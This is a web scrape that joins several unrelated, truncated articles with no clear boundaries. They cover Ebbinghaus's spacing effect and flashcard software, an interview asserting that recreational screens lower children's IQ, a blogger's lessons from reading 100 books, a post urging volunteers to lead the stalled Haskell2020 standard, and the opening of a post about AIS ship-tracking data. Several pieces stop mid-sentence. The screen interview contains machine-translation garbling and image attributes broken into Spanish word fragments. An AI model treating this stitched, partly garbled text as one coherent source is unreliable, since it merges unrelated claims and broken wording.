<p>The first thing he noticed was that memories are at their most fragile when they are still young. From the data he’d collected, he could see that the bulk of forgetting happens in the few moments after the memory is created. Rather than forgetting happening at a linear pace over time, each day that passes nicking a constant amount of the vitality of a memory until it is completely forgotten, Ebbinghaus discovered <span>forgetting happens rather rapidly at first but slows down afterward.&nbsp;</span></p>

<p>In the first few hours of its life, it’s as if your newly created memory has jumped out of a flying airplane and is now free-falling through the sky, the wind buffeting its face violently as it quickly loses altitude. As the ground becomes uncomfortably close, our memory activates its parachute and begins to glide, still falling, of course, but much slower than it was when it first jumped out of the plane.&nbsp;
&nbsp;
Now, to be sure, <span>the forgetting curve,</span> as this discovery came to be called, is an important landmark in the scientific study of memory, but it’s not a particularly useful one. We forget things over time; what a discovery! You don’t need to be a top-level scientist to come to that conclusion. It’s why we’re here in the first place!</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/b79bb8c6906d331e07905d708043194c5288a3bd/e385a/assets/images/agentleintroductiontoanki/forgettingcurve_alternative.jpg" alt=""></p>
<p> Behold, my superlative drawing skills!</p>
<p>But Ebbinghaus didn’t stop there.
&nbsp;
When he first started learning his lists of nonsense syllables, Ebbinghaus, like many a student, crammed all his studying in a single furious session. But then, possibly because he was fed up with all the cramming, he hit upon the idea of spreading his learning over time. Instead of spending the majority of a day learning one of his lists, he spaced out his learning over a few days. <span>What he found when he did so is the most important discovery about memory that no one ever told you about.</span></p>

<p>You would think not much would change if instead of studying a bunch of material in one day you did so over three or more days. But what Ebbinghaus found was that not only did his memory get stronger, but it also took him less time to memorize his lists. This meant that <span>simply by changing when he studied, Ebbinghaus could have the best of both worlds: a better memory with less time spent studying.&nbsp;</span></p>

<p>It need not be pointed out how important a discovery this is. If someone came up to you and told you about a revolutionary studying method that would not only cut the time you spent studying but also get you to retain the things you learn for longer, you would think you were being sold on some sort of scam.</p>

<p>Yet <span>the spacing effect,</span> as Ebbinghaus’ discovery is called, is far from being a scam. It is <span>one of the most scientifically supported discoveries in the entire field of psychology.</span></p>

<p>The gist of the spacing effect is rather simple. Given the choice between massing all your studying or spacing it out over a period of time, you are better served by spacing it out. <span>There is no catch. It really is that simple.&nbsp;</span></p>

<p>This means if you are a student and you have an exam coming up a month from now, you should start studying now rather than waiting until a single week is left. If, for example, you’re going to spend 50 hours studying, then spreading those hours over the whole month, ensuring that you get re-exposed to the material in sufficiently spaced intervals, would get you much better results than you would if you crammed those 50 hours in a single stress-filled and coffee-fueled week.&nbsp;</p>

<p>Of course, that’s easier said than done.&nbsp;</p>

<p><span>The spacing effect is one of the most important weapons a learner can have on his arsenal</span> but knowing about its amazing effects does not mean that we will necessarily apply it. After all, we all know not to eat too many processed foods do we not? Yet, that doesn’t seem to stop many of us.&nbsp;</p>

<p>Pulling an all-nighter to cram for an exam is like binging on a sugar-filled pastry when one is trying to lose weight, yet the fact it continues to be a staple learning strategy of many a student is a testament to how difficult it can be to embrace the lessons of the spacing effect.&nbsp;</p>

<p>If only there were an app for that…</p>

<h2 id="this-app-will-turn-your-memory-into-a-superpower">This App Will Turn Your Memory Into A Superpower</h2>

<p>One hundred years ago Ebbinghaus didn’t have a computer, let alone a smartphone. If he’d had them they would have taken care of the task of spacing what he had to learn for him. Instead, he had to do all of that himself, though if we consider that he was the kind of guy that did not balk at the idea of spending hundreds of hours learning endless lists of nonsense, perhaps he wasn’t that fazed by it.</p>

<p>Thankfully, today we have tools that manage all of that for us.</p>

<p><span> And it all starts with a simple flashcard.&nbsp;</span></p>

<p>Everyone knows how a flashcard is supposed to work. You write something on the front, then something on the back, and then you’re supposed to recall what it was that you wrote on the back after reading what’s on the front.&nbsp;</p>

<p>Suppose that in the process of studying for a coming exam, you wrote many of these flashcards. You have a big pile of them sitting on your desk and within them are all the things you have to know if you want to ace that exam.&nbsp;</p>

<p>Because you know about the spacing effect, you know that cramming those flashcards is a bad strategy, but then how are you supposed to space them out? There are so many cards to keep track of…</p>

<p><span>What    if those flashcards existed on your computer instead?&nbsp;</span></p>

<p>If that were possible, then the computer could take care of the task of keeping track when you’re supposed to review your flashcards and you could focus solely on the things that matter, which, in this case, is answering your flashcards correctly and acing that exam.&nbsp;</p>

<p>Which is why spaced repetition software was invented: to take care of all the grunt work so you can easily add spaced repetition into your life.</p>

<p>At its core, all spaced repetition software does is keep track of when to present you with the material that you put in it. It’s called spaced repetition software because they use special algorithms to calculate the optimal interval between when you last reviewed the material and …</p></div></section></div></div>

<p>Several studies have shown that when the use of television or video games increases, IQ and cognitive development decrease.</p>
<p>The main foundations of our intelligence are affected: language, concentration, memory, culture (defined as a body of knowledge that helps us organize and understand the world).</p>
<p>Ultimately, these impacts lead to a significant drop in academic performance.</p>
<p><strong>And why does the use of digital devices cause all that? </strong></p>
<p>The causes are also clearly identified: decrease in the quality and quantity of intrafamily interactions, which are fundamental for the development of language and emotional development; decrease in time devoted to other more enriching activities (homework, music, art, reading, etc.); sleep disruption, which is quantitatively shortened and qualitatively degraded; overstimulation of attention, leading to disorders of concentration, learning and impulsivity; Intellectual under-stimulation, which prevents the brain from unfolding its full potential; and an excessive sedentary lifestyle that, in addition to bodily development, influences brain maturation.</p>
<p><strong>What exactly damage do screens do to the neurological system? </strong></p>
<p>The brain is not a ‘stable’ organ. Its ‘final’ characteristics depend on experience.</p>
<p>The world in which we live, the challenges we face, modify both the structure and its functioning, and some regions of the brain specialize, some networks are created and strengthened, others are lost, some become thicker and others thinner.</p>

<p>Time spent in front of a screen for recreational reasons has been observed to delay anatomical and functional maturation of the brain within various cognitive networks related to language and attention.</p>
<p>It must be emphasized that not all activities feed the construction of the brain with the same efficiency.</p>
<p><strong>What does it mean? </strong></p>
<p>Activities related to school, intellectual work, reading, music, art, sports, etc. they have a much greater structuring and nourishing power to the brain than recreational screens.</p>
<p>But nothing lasts forever. The potential for brain plasticity is extreme during childhood and adolescence. Afterwards, it begins to fade. It doesn’t go away, but it becomes much less efficient.</p>
<p><img data-src="https://thestateindia.com/wp-content/uploads/2020/09/Why-Mexico-is-one-of-the-countries-with-the-most.gif" alt="" cuando="" se="" pone="" una="" pantalla="" en="" manos="" de="" un="" niño="" o="" adolescente,="" casi="" siempre="" prevalecen="" los="" usos="" recreativos="" más="" empobrecedores"",="" source:="" ,="" source="" description:="" image:="" "="" data-lazy-src="https://thestateindia.com/wp-content/uploads/2020/10/1603970619_593_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png" src="https://thestateindia.com/wp-content/uploads/2020/10/1603970619_593_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png"></p>

<p>The brain can be compared to a plasticine. At first, it is wet and easy to sculpt. But over time it becomes drier and much more difficult to mold.</p>
<p>The problem with recreational screens is that they alter the development of our children’s brain and impoverish it.</p>
<p><strong>Are all screens equally harmful? </strong></p>
<p>Nobody says that the “digital revolution” is bad and should be stopped. I myself spend a good part of my working day with digital tools. And when my daughter entered elementary school, I started teaching her how to use some office software and looking for information on the internet.</p>
<p>Should students be taught fundamental computer skills and tools? Clear. Likewise, can digital technology be a relevant tool in the pedagogical arsenal of teachers? Of course, if it is part of a structured educational project and if the use of a certain software effectively promotes transmission.</p>
<p>However, when a screen is placed in the hands of a child or adolescent, the most impoverishing recreational uses almost always prevail.</p>
<p>This includes, in order of importance: television, which remains the number one screen of all ages (movies, series, clips, etc.); then video games (mainly action and violent), and finally, around adolescence, a frenzy of useless self-exposure on social media.</p>
<p><strong>How much time do children and young people usually spend in front of screens? </strong></p>
<p>On average, nearly three hours a day for 2-year-olds, about five hours for 8-year-olds, and more than seven hours for teens.</p>

</figcaption></figure>
<p>This means that before reaching 18 years of age, our children will have spent the equivalent of 30 school years in front of recreational screens or, if you prefer, 16 years of full-time work!
</p>
<p>It is simply insane and irresponsible.</p>
<p><strong>How much time should children spend on recreational screens? </strong></p>
<p>Involving children is important.</p>
<p>They need to be told that recreational screens damage the brain, impair sleep, interfere with language acquisition, weaken academic performance, impair concentration, increase the risk of obesity, etc.</p>
<p>Some studies have shown that it is easier for children and adolescents to follow the rules about screens when their reason for being is explained and discussed with them.</p>
<p><img data-src="https://thestateindia.com/wp-content/uploads/2020/09/Why-Mexico-is-one-of-the-countries-with-the-most.gif" alt="" involucrar="" a="" los="" niños="" es="" importante.="" necesitan="" que="" se="" les="" diga="" las="" pantallas="" recreativas="" dañan="" el="" cerebro,="" perjudican="" sueño,="" interfieren="" con="" la="" adquisición="" del="" lenguaje"",="" source:="" ,="" source="" description:="" image:="" "="" data-lazy-src="https://thestateindia.com/wp-content/uploads/2020/10/1603970620_943_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png" src="https://thestateindia.com/wp-content/uploads/2020/10/1603970620_943_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png"></p>

<p>From there, the general idea is simple: at any age, the least is the best.</p>
<p>Beyond this general rule, more specific guidelines can be provided based on the child’s age. Before the age of 6, the ideal is not to have screens (which does not mean that from time to time you cannot watch cartoons with your children).</p>
<p>The earlier they are exposed, the greater the negative impacts and the risk of subsequent excessive consumption.</p>
<p>From 6 years of age, if the contents are adapted and sleep is maintained, it can go up to half an hour a day, even an hour, without an appreciable negative influence.</p>
<p>Other relevant rules: no screens in the morning before going to school, nothing at night before going to bed or when with other people. And, above all, no screens in the bedroom.</p>
<p>But it’s hard to tell our kids that screens are a problem when we, as parents, are constantly connected to our smartphones or game consoles.</p>
<p><img data-src="https://thestateindia.com/wp-content/uploads/2020/09/Why-Mexico-is-one-of-the-countries-with-the-most.gif" alt="" reglas="" relevantes:="" nada="" de="" pantallas="" por="" la="" mañana="" antes="" ir="" a="" escuela,="" noche="" irse="" cama...="" ¡sobre="" todo!="" en="" el="" dormitorio"",="" source:="" ,="" source="" description:="" image:="" "="" data-lazy-src="https://thestateindia.com/wp-content/uploads/2020/10/1603970620_123_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png" src="https://thestateindia.com/wp-content/uploads/2020/10/1603970620_123_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png"></p>

<p><strong>Why are many parents unaware of the dangers of screens? </strong></p>
<p>Because the information given to parents is partial and biased. The mainstream media is rife with unsubstantiated claims, misleading propaganda, and inaccurate information. The discrepancy between media content and scientific reality is often disturbing, if not infuriating.</p>
<p>I don’t mean to say that the media is dishonest: separating the wheat from the chaff is not easy, even for honest and conscientious journalists.</p>
<p>But not surprising. The digital industry generates billions of dollars in profits each year. And, obviously, children and adolescents are a very lucrative resource.</p>
<p>And for companies worth billions of dollars, it is easy to find complacent scientists, dedicated lobbyists and enthusiastic traders of doubts.</p>
<p>Let me give you an example.</p>
<figure>
<figure id=""><img loading="lazy" data-src="https://thestateindia.com/wp-content/uploads/2020/10/1603970620_781_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.jpg" alt="boy playing video games" src="https://thestateindia.com/wp-content/uploads/2020/10/1603970620_781_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.jpg"><figcaption>Digital companies hire experts to explain how smart gamers are and how good it is to play video games. (Photo: Tomohiro Ohsumi / Getty Images)</figcaption></figure><figcaption>
</figcaption></figure>
<p>Recently a psychologist, supposedly an expert in video games, explained in various media that these games had positive effects, that they should not be demonized, that not playing could even be a handicap for the future of a child, that the most violent games could have therapeutic actions and be able to quench anger in players, etc.</p>
<p>The problem is that none of the journalists who interviewed this “expert” mentioned that he worked for the video game industry. And this is just one example among the many that are described in my book.</p>
<p>This is not something new: it happened in the past with tobacco, global warming, pesticides, sugar, etc.</p>
<p>But I think there is room for hope. Over time, reality becomes increasingly difficult to deny.</p>
<p><img data-src="https://thestateindia.com/wp-content/uploads/2020/09/Why-Mexico-is-one-of-the-countries-with-the-most.gif" alt="" en="" una="" investigación="" se="" entregaron="" consolas="" de="" juegos="" a="" niños="" que="" iban="" bien="" la="" escuela.="" después="" 4="" meses,="" descubrió="" pasaban="" más="" tiempo="" jugando="" y="" menos="" haciendo="" tareas"",="" source:="" ,="" source="" description:="" image:="" "="" data-lazy-src="https://thestateindia.com/wp-content/uploads/2020/10/1603970621_226_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png" src="https://thestateindia.com/wp-content/uploads/2020/10/1603970621_226_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png"></p>

<p><strong>There are studies that affirm, for example, that video games help to obtain better academic results … </strong></p>
<p>Let me put it frankly: that’s sheer nonsense.</p>
<p>That idea is a true masterpiece of propaganda. It is mainly based on a few isolated studies with rotten data, which are published in secondary journals and are often contradicted.</p>
<p>In an interesting experimental investigation, game consoles were given to children who were doing well in school. After four months, they were found to spend more time playing games and less time doing homework. Their grades dropped about 5% (which is a lot in just four months!).</p>
<p>In another study, children had to learn a list of words. An hour later, some were allowed to play a car racing video game. Two hours later they went to bed.</p>
<figure>
<figure id=""><img loading="lazy" data-src="https://thestateindia.com/wp-content/uploads/2020/10/1603970621_507_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.jpg" alt="boy using a screen" src="https://thestateindia.com/wp-content/uploads/2020/10/1603970621_507_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.jpg"><figcaption>(Photo: Isabel Pavia / Getty Images)</figcaption></figure>

</figure>
<p>The next morning, the children who did not play recalled about 80% of the lesson compared to 50% of the players.
</p>
<p>The authors found that playing interfered with sleep and memorization.</p>
<p><strong>How </strong><strong>believe to be</strong><strong>members of</strong><strong> this digital generation </strong><strong>when </strong><strong>become adults? </strong></p>
<p>I often hear that digital natives know “differently.” The idea is that although they show linguistic, attention and knowledge deficits, they are very good at “other things”.</p>
<p>The question lies in the definition of those “other things”.</p>
<p>Various studies indicate that, in contrast to common beliefs, they are not very good with computers.</p>
<p>A report from the European Union even explains that their low digital competence hinders the adoption of educational technologies in schools.</p>
<p>Other studies also indicate that they are not very efficient at processing and understanding the vast amount of information available on the internet.</p>

<p><em>I was a naive kid. When I was younger, whenever I came across books like <a href="https://durmonski.com/book-summaries/rich-dad-poor-dad/" target="_blank" aria-label="Rich Dad Poor Dad (opens in a new tab)" rel="noreferrer noopener">Rich Dad Poor Dad</a>, I thought that by just reading what’s written inside I will magically become a millionaire. Or, by studying the lessons presented in <a href="https://durmonski.com/book-summaries/the-7-habits-of-highly-effective-people/" target="_blank" aria-label="The 7 Habits of Highly Effective People (opens in a new tab)" rel="noreferrer noopener">The 7 Habits of Highly Effective People</a>, I will transform into a successful business owner who is not holding any sabotaging habits. After all, these books always came with a step-by-step framework that I diligently followed. And while didn’t come close to becoming an ultra-rich entrepreneur, like these titles promised, how my life turned out eventually, which is not bad at all, is thanks to my reading habit.</em></p>



<p>I actually used to despise reading. My parents were constantly shoving books in my face and forcing me to read literature that didn’t even interest me closely. </p>



<p>The books I had to read according to my folks during my teenage years were either part of my school curriculum or titles that were famous years ago. Of course, like every self-respecting teenager trying to look cool, I rebelled against these rules and did the only thing I could – I stopped reading altogether.</p>



<p>Somewhere deep down though, I knew that reading was good, but spending my time studying historical novels related to my country, or fact-heavy encyclopedia-like hardcovers didn’t seem practical to me.</p>



<p>Probably it’s because I grew up playing video games, or because my brother and I collected choose-your-own-adventure type of books when we were younger. But I always assumed that I should get some sort of outcome when I was reading a book. A book should help me learn a skill, conquer a territory, slave a dragon, and in way level up.</p>



<p>Sadly, this wasn’t the case with the novels that the school system imposed on me. These books were only throwing isolated facts that were not related to my existence here and now. That’s why I was careless about literature when I was a teenager.</p>



<p>Fortunately, later in my life, I re-evaluate my relationship with the libraries.</p>



<p>Things changed when I found out about the existence of the applied psychology category. At least that’s how the libraries of my country label the self-help genre. I was thrilled. Books that can help you master a skill? It sounded magical. </p>



<p>That’s when I found titles like <a href="https://durmonski.com/book-summaries/think-and-grow-rich/" target="_blank" aria-label="Think and Grow Rich (opens in a new tab)" rel="noreferrer noopener">Think and Grow Rich</a>, <a href="https://durmonski.com/book-summaries/influence/" target="_blank" aria-label="Influence (opens in a new tab)" rel="noreferrer noopener">Influence</a>, <a href="https://durmonski.com/book-summaries/outwitting-the-devil/" target="_blank" aria-label="Outwitting the Devil (opens in a new tab)" rel="noreferrer noopener">Outwitting the Devil</a>, and similar mind-transforming hardcovers. To me, these books looked like volumes full of spells – filled with practical advice that can change your life when you apply them.</p>



<p>That’s when my reading journey began. </p>



<p>To this date, I’ve probably read more than 150 books. 100 of these titles are carefully categorized and summarized <a href="https://durmonski.com/category/book-summaries/" target="_blank" aria-label="here (opens in a new tab)" rel="noreferrer noopener">here</a> on my site.</p>



<p>I learned a lot from these books in terms of skills and know-how. But I also learned something that I believe is more valuable – how to approach reading. </p>



<p>When I first started reading, I picked the books that were in front of me – sort to speak. I always grabbed the most talked-about books, thinking, that they hold all the answers in the world.</p>



<p>Now, I know that the best-sellers section doesn’t include the finest titles. Also, I know that reading alone, or reading piles of books, is only half of the battle. I spend a lot of time before I decide what I should read. My approach to books and what titles I should read is completely transformed. But most importantly, I do my best to implement what’s mentioned in the titles I read.</p>



<p>In this article, I’ll share with you 10 thoughts after reading 100 books. The goal is not only to help you become a better reader and better book-picker, but also to share with you some insights about how books can change you for the better.</p>



<p>So, here are 10 things I learned from reading and later <a aria-label="summarizing (opens in a new tab)" rel="noreferrer noopener" href="https://durmonski.com/private/summarizing-books/" target="_blank">summarizing</a> 100 books.</p>







<h2 id="0-10-thoughts-from-reading-100-books-">10 Thoughts from Reading 100 Books </h2>





<h3 id="1-1-best-selling-books-are-usually-crap">1. Best-Selling Books are Usually Crap</h3>



<p>This is not entirely true of course.</p>



<p>There are a lot of exceptions. For example, books like <a href="https://durmonski.com/book-summaries/atomic-habits/" target="_blank" aria-label="Atomic Habits (opens in a new tab)" rel="noreferrer noopener">Atomic Habits</a> or <a href="https://durmonski.com/book-summaries/the-laws-of-human-nature/" target="_blank" aria-label="The Laws of Human Nature (opens in a new tab)" rel="noreferrer noopener">The Laws of Human Nature</a> are nice examples of how good work pays off and how word-of-mouth has the power to bring good literature into the hands of millions of people.</p>



<p>But in general, best-selling books are created with the wrong initiatives.</p>



<p>As strange as it might sound, the usefulness of the content for the authors of best-sellers is not the most important thing in a book – it’s the desire to make money. What I found out is that they usually grab a bunch of blog posts from their site, put them in one place, and call it a book. This means that the content is absent from real meaningful research. You’re basically paying (not always, but a lot of times) for content that’s already free but this time it’s on paper.</p>



<p>Most best-selling self-help books are full of vague conclusions, offer no value whatsoever, and can be summarized in the following sentence: “You can do it!”</p>



<p>Why they are successful then?</p>



<p>If you trace back the wide success of these popular books, you’ll spot that the author is someone who has a large online audience. And when you have a network of people who are following you online, the success of your book is guaranteed.</p>



<p>Also, if the above is true, the publisher will invest a lot of funds to market the book. This basically means that the success of the book relies on the large email list and social media following of the author – the distribution channels – not on the actual content.</p>



<p>Therefore, such books, best-selling books, should be approached with caution.</p>







<h3 id="2-2-read-foundational-books-often-mentioned-in-the-bibliography-section">2. Read Foundational Books – Often Mentioned in The Bibliography Section</h3>



<p>I used to skip the bibliography section of the books I read. You know, the part in the back of the book where the author lists the titles he used in the creation of his work or such that somehow influenced his project.</p>



<p>Now, I can’t wait to check this section so I can add new additions to my to-read list.</p>



<p>Once you spend enough time investigating in this rarely explored section of the back of the books, you spot patterns. You see how the same titles are cited again and again.</p>



<p>And once you read some of these books, you get to see why they are so frequently mentioned in the corner of the most successful books that are full of vague action tips – because these rarely-mentioned by big sites books are the real deal. They are full of insights and valuable thinking patterns that can change the way you approach life.</p>



<p>For example, if you want to increase your productivity, you will surely find a lot of self-help books that promise to boost your overall performance. But if you want to <em>get</em> why you procrastinate, really understand why your body is now one with the couch, you should read <a href="https://durmonski.com/book-summaries/flow/" target="_blank" aria-label="Flow (opens in a new tab)" rel="noreferrer noopener">Flow</a> by Mihaly Csikszentmihalyi.</p>



<p>If you want to find meaning in our crazy world and escape the modern dogma of consumerism, you’ll surely stumble on less than favorable titles like The Monk Who Sold His Ferrari, or Girl, Wash Your Face. But if you really want to understand how meaning is formed and what does it take to find your course in life, you should read <a href="https://durmonski.com/book-summaries/the-evolving-self/" target="_blank" aria-label="The Evolving Self (opens in a new tab)" rel="noreferrer noopener">The Evolving Self</a> by Robert Kegan and/or <a href="https://durmonski.com/book-summaries/to-have-or-to-be/" target="_blank" aria-label="To Have or to Be? (opens in a new tab)" rel="noreferrer noopener">To Have or to Be?</a> by Erich Fromm.</p>



<p>Sadly, people don’t want to read these books.</p>



<p>They don’t have enough “social status” and sharing them with others won’t inspire a lot of interest from your peers towards you.</p>



<p>It’s kind of like in the tech industry. You know that a regular phone, a device that costs around 500 bucks will do the job perfectly. But no, you want the latest iPhone because this is what people really value and expect to see.</p>



<p>That’s why we spend our time digesting famous books. We are more interested in impressing others when they check our reading list, not so much ourselves.</p>







<h3 id="3-3-good-books-are-usually-hard-to-get">3. Good Books are Usually Hard to Get</h3>



<p>Hard to read, full of words you don’t really understand, these are usually the best books – especially in the field of <a href="https://durmonski.com/category/book-summaries/philosophy/" target="_blank" aria-label="philosophy (opens in a new tab)" rel="noreferrer noopener">philosophy</a> and <a href="https://durmonski.com/category/book-summaries/psychology-books/" target="_blank" aria-label="psychology (opens in a new tab)" rel="noreferrer noopener">psychology</a>.</p>



<p>At first, if you decide to explore such titles, you’ll blame the author for not using simpler words and for not expressing himself better. And if there are long-winded sections where you don’t get what the premise of the idea is, you’ll most probably ditch the book and find something else to read instead.</p>



<p>But these elaborate creations full of complicated phrases are what you need to level up your thinking.</p>



<p>Surely reading a novel where you can predict what will happen next feels good. But real learning comes from books that flex your mind and prompt you to think about the argument the author is making.</p>



<p>This is something I only recently realized. Before, I was cynical about hard to get books. That’s why I rated one of the most cited books poorly – <a href="https://durmonski.com/book-summaries/thinking-fast-and-slow/" target="_blank" aria-label="Thinking, Fast and Slow (opens in a new tab)" rel="noreferrer noopener">Thinking, Fast and Slow</a>.</p>



<p>When I read it 2 years ago, I considered it unrelentingly tedious and pretentious. But the book wasn’t the problem, I was.</p>



<p>My assumption was that books have to be easy to get. Now, after reading more than 100 books and summarizing most of them, I know that’s not the case.</p>



<p>A good book doesn’t have to be easy to understand. A good book should make you stop and think about what is said inside. To confuse you and make you re-read the same passage again and again. If the pages inside don’t prompt you to think and even make you feel lost at times, then you’re not reading the proper title.</p>







<h3 id="4-4-figure-out-what-you-want-to-learn-first-then-search-for-a-book">4. Figure Out What You Want to Learn First, Then Search For a Book</h3>



<p>Most people approach reading the wrong way. They don’t think about what they want to learn and master, they simply read books that are in front of them. Best-selling books, or books recommended by their peers.</p>



<p>This approach is fine if you simply want to relax and unwind from your busy day. But if you want to improve in a specific area, you shouldn’t pick the title that’s sitting on the most popular reading list. You should, first, figure out what you want to learn and then go to the library with a clear goal.</p>



<p>That’s usually how we approach pretty much everything in life. We don’t hop online with clear goals in …</p></div></div></div>

November 20, 2020 | https://reasonablypolymorphic.com/blog/haskell202x/ | <a href="https://web.archive.org/web/*/https://reasonablypolymorphic.com/blog/haskell202x/">archive.org</a>

    <p>Haskell2020 is the long-awaited sequel to Haskell2010 — a formal, prescriptive standard of the Haskell language, that all implementations should adhere to. Today we have two previous standards, Haskell2010 and Haskell98, but neither is particularly in-line with the language as it’s written in this day and age. The aim of Haskell2020 is to bring these older standards in line with the way the language is actually practiced.</p>
<p>Today, there is only one real implementation of Haskell: the Glasgow Haskell Compiler (GHC). GHC is a Haskell2010-compliant compiler, but extends Haskell via <em>language extensions</em> — explicitly opt-in features that deviate from the standard. In GHC 8.6.5, there are 125 different language extensions, and <a href="https://gist.github.com/atondwal/ee869b951b5cf9b6653f7deda0b7dbd8">an analysis</a> shows that 10% of Haskell files in the wild enable 10 or more extensions.</p>
<p>All of this is to say that a good chunk of the Haskell being written in the real world <em>is not Haskell2010 compatible.</em> And the situation is only going to get worse.</p>
<p>It might not be immediately evident to you why this is a bad thing. As excellent a piece of software as GHC is, tying our language to a single implementation is unwise and shortsighted. As long as Haskell is defined implicitly by its implementation in GHC, no other implementation has a chance — they will always be forever playing catch-up.</p>
<p>C++ was in a similar situation in the early naughties; the de facto C++ compiler GCC was the only heavy-hitter in town. While it got the job done, it had some pretty terrible ergonomics — so bad that it spun up a cottage industry of attempting to <a href="https://codegolf.stackexchange.com/questions/1956/generate-the-longest-error-message-in-c">generate the worst error messages</a>. In 2007, Clang — an alternative industrial-strength compiler — was released, which strove to be compatible with GCC, but also to dramatically improve the ergonomics. This friendly competition has spurred both projects to become significantly better.</p>
<p>And we have seen similar beneficial competition (albeit certainly less friendly) in the Haskell world. Five years ago, Cabal sort-of got the job done for building Haskell projects, but there was this thing called “Cabal Hell” that bit <em>everyone.</em> It got the job done if you knew how it worked, which all the developers did, but the pain was felt by everyone else. Then Stack was released, which elegantly solved Cabal Hell, and <em>just worked.</em> It wasn’t perfect, but my god was it an improvement on the state of the world. In recent memory, Cabal has seen unparalleled improvements in its usability, after languishing for <em>years</em> with respect to usability complaints.</p>
<p>My point? Competition is a good thing, not just for users, but for the health of the ecosystem at large. And by extension, we should look at the status quo of today’s Haskell world with suspicion. And getting a good, prescriptive specification of what Haskell <em>is</em> would go a long way towards alleviating this issue.</p>
<p>So why do I bring all of this up? It’s my impression that the current Haskell2020 efforts are dead in all but name. The <a href="https://mail.haskell.org/pipermail/haskell-prime/">official mailing list</a> didn’t see any activity for 12 of the last 24 months. Of the months that did see activity, several of their volumes are measured in <em>bytes.</em> At time of writing, the official Haskell2020 website’s certificates are expired, and have been for two weeks.</p>
<p>None of this is meant to demonize the standards committee. But for whatever reason, it’s pretty clear that Haskell2020 is not going to happen in its current incarnation. After all, 2020 is coming up pretty dang soon!</p>
<p>Forgive the melodrama, but I truly believe that this situation is an existential risk for our beloved language and community. There are already well-founded <a href="https://www.reddit.com/r/haskell/comments/dpr276/what_is_the_status_of_ghc_linear_types/f5yjg67/">murmurings of dissatisfaction</a>, and <em>lots</em> of complaints about the lack of good tooling (though regrettably I can’t find any links right now.)</p>
<p>So what’s the real problem here? As a complete outsider — reading between the lines of discussions I’ve had with a few of the Haskell2020 committee members — my guess is this: <strong>a lack of leadership.</strong> It’s not that the committee members don’t care, it’s that nobody cares <em>sufficiently</em> to overcome the momentum and push the thing through to completion. Furthermore, these people are busy with their own cool projects, and committee work is always a thankless job.</p>
<p>The good news: a lack of leadership is a <em>very easy problem to solve.</em> If you care about this problem, <strong>just take the reigns.</strong> That’s all there is to it. <em>Anyone can do it.</em> Yes, even you, gentle reader! Nobody needs to elevate you to a position of power. There’s no admissions process. You don’t need to be given any <em>authority</em> in order to take the lead here. This is a thing that everybody wants, but there’s a coordination problem, and the only reason it hasn’t been done yet is that nobody has done it.</p>
<p>If you want more assurance about that: as a member of the GHC Steering Committee, <strong>I will personally ratify any reasonable draft standard of Haskell 202x</strong> and vote in favor that GHC adheres to that standard. I have confirmation from at least two other members of the committee that they will also do so.</p>
<p>As a rough estimate, the effort involved in Haskel202x is about half a person-year. Most of that will be spent doing unsexy, administrative things like setting deadlines, cajoling the right people for opinions, and writing a big, boring document. Not a lot of fun, to be sure, but <em>very doable.</em> The only challenge here is to not lose motivation for six months.</p>
<p>Should you still have doubts, I’d like to give another example: the GHC Steering Committee. Despite some (fair) criticisms, all things considered, the Steering Committee is a pretty successful organization. But <em>literally the only reason</em> for that success is Joachim’s unyielding desire for it to succeed. Without his monthly emails reminding everyone of the work to be done, and who is responsible for what, the Committee would collapse in three months. Nobody gave Joachim this responsibility, he just took it and owned it. In my opinion, the entire Haskell community is deeply indebted to Joachim on this front.</p>
<p>If all of this sounds inspiring to you, I urge you to take up the mantle and <em>make this thing happen.</em> It’s the first step towards a much better Haskell world, and it’s an amazingly actionable one. You can help change the world for the better, and we will all be indebted to you when you pull it off.</p>

November 20, 2020 | https://blog.senx.io/ais-data-made-easy/ | <a href="https://web.archive.org/web/*/https://blog.senx.io/ais-data-made-easy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>AIS data are being integrated in many applications. Managing those data at scale can prove cumbersome. This post introduces TrueSea by SenX, a turnkey solution for AIS data built on the acclaimed Warp 10 Geo Time Series platform.</p><article>
      
<p>Data from the <a href="https://en.wikipedia.org/wiki/Automatic_identification_system" target="_blank" rel="noreferrer noopener">Automatic Identification System</a> (AIS for short) allows the tracking of vessels around the world. They are being integrated into a growing number of applications from insurance companies, defense agencies, or financial services.</p>



<p>These data are emitted periodically by ships at sea or at moorings and can represent millions of daily messages, bringing with them challenges of their own. </p>



<p>This blog post will present some of those challenges and how SenX can help you solve them, creating more value from all those AIS messages.</p>



<h2>What is AIS?</h2>



<p>The Automatic Identification System was created to increase the safety at sea by enabling ships to identify nearby vessels to avoid collisions and by facilitating Search and Rescue (SAR) operations. It was made mandatory by the 2002 IMO SOLAS agreement for all vessels above 300 GT.</p>



<p><strong>Technically AIS is a system that transmits over VHF short messages with information about the vessels.</strong> </p>



<p>There are three main types of information being transmitted.</p>



<ul><li>Static infos about the ship, such as its name and IMO number, its size or type, and the location of the antenna acquiring the position, which is important on a 300m tanker or cargo ship for example. Those informations are transmitted every 6 minutes.</li><li>Voyage informations, also transmitted every 6 minutes. These include the type of cargo, the current destination of the ship and its ETA, its planned route, and some safety-related infos.</li><li>Lastly, dynamic informations which are transmitted more often when the ship is moving and depending on its speed. Those infos include the vessel's speed and course on ground, its heading, its rate of turn, navigation status, and other indicators.</li></ul>



<h2>Where can AIS data be acquired?</h2>



<p>AIS messages are transmitted via VHF radio waves in an unencrypted format. They can be picked up by any station with a line of sight view of the emitter's antenna. This has led to the proliferation of hobbyists on coastal areas deploying cheap <a href="https://en.wikipedia.org/wiki/Software-defined_radio" target="_blank" rel="noreferrer noopener">SDR</a> dongles with Open Source <a href="https://github.com/dgiardini/rtl-ais" target="_blank" rel="noreferrer noopener">software</a> able to decode the AIS chatter.</p>



